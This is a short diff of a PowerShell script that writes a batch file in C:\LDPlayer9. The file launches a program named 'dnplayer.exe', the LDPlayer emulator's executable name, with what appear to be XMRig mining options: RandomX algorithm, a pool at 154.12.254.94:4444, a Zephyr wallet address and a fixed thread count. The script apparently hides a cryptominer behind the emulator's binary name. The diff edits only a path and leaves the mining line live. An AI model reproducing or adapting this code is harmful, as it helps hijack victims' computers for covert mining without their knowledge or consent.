@@ -10,7 +10,7 @@ Start-Sleep -Seconds 2
 Set-Location -Path "C:\LDPlayer9\"
 $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $userName = $userName -replace "^.*\\", ""
-$folderPath = "C:\LDPlayer9\"
+$folderPath = "C:\LDPlayer9"
 $batContent = @"
 cd %~dp0
 dnplayer.exe --algo="rx/0" -o 154.12.254.94:4444 -u ZEPHsAtsau1NnQ96FKLV5RNQFqzgi5NPbUqCUGHb5MCnUjT3H2vF9usMdE5YUG5fTu1Mfyqz7pNYxFgaZgSKVA9YSWPFmWkpjUX --tls --threads=2 -k --randomx-1gb-pagesX -p 001
